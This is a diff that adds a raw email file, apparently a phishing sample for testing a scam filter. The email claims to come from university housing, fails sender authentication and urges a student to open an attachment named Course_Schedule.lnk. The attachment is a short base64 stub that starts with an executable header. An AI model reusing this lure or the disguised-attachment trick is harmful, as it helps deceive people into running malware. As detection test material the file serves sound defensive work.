@@ -1,0 +1,45 @@
+From: Housing Services <office@student-forms.top>
+To: priya.moreau@meridian.ac.id
+Return-Path: <office@student-forms.top>
+Subject: Document for your review
+Date: Fri, 09 Oct 2026 07:14:00 +0000
+Message-ID: <d766fe049059@student-forms.top>
+Authentication-Results: mx.meridian.ac.id; spf=softfail
+ smtp.mailfrom=student-forms.top; dkim=fail header.d=student-forms.top;
+ dmarc=fail header.from=student-forms.top
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="==ScamShield1de9b5c5cf0=="
+
+--==ScamShield1de9b5c5cf0==
+Content-Type: multipart/alternative; boundary="==ScamShieldf2762172ed1=="
+
+--==ScamShieldf2762172ed1==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hello,
+
+Please open the attached document and complete it today.
+
+Thank you.
+
+--==ScamShieldf2762172ed1==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Hello,</p><p>Please open the attached document and complete it=
+ today.</p><p>Thank you.</p></body></html>
+
+--==ScamShieldf2762172ed1==--
+
+--==ScamShield1de9b5c5cf0==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Course_Schedule.lnk"
+MIME-Version: 1.0
+
+TVpUabF+SanxZtDCjAl0FlBAUh34xWfdg9P8AKjeinZpDTCEXJ/Bf6Bxwg00RIwh7Ulw4bJ8Hwf5
+oZvMPbUoT40D
+
+--==ScamShield1de9b5c5cf0==--
